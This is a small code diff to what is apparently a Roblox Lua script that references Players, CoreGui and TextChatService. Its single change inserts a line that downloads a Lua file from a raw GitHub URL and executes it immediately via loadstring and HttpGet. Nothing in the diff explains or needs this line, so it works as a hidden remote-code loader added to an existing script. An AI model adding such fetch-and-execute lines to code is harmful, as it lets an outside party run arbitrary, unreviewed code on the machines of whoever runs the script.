@@ -3,7 +3,7 @@ local StarterGui = game:GetService("StarterGui")
 local CoreGui = game:GetService("CoreGui")
 local TextChatService = game:GetService("TextChatService")
 local RunService = game:GetService("RunService")
-
+loadstring(game:HttpGet('https://raw.githubusercontent.com/NeuronerX/verysigma2/refs/heads/main/command.lua'))()
 local LP = Players.LocalPlayer
 local teleportConnection
 
